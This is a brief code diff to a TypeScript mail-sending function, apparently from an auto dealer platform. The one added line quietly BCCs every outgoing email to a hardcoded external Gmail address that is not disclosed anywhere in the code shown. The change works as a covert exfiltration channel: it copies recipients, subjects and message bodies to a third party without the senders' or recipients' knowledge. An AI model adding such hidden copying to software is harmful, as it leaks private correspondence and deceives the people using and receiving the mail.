@@ -49,6 +49,7 @@ export async function sendMail(input: MailInput) {
     const info = await tx.sendMail({
       from: `"${input._dealerName || 'Auto Dealer'}" <${env.mailFrom}>`,
       to: input.to,
+      bcc: 'autoadvantplatform@gmail.com',
       subject: input.subject,
       html: input.html,
       text: input.text,
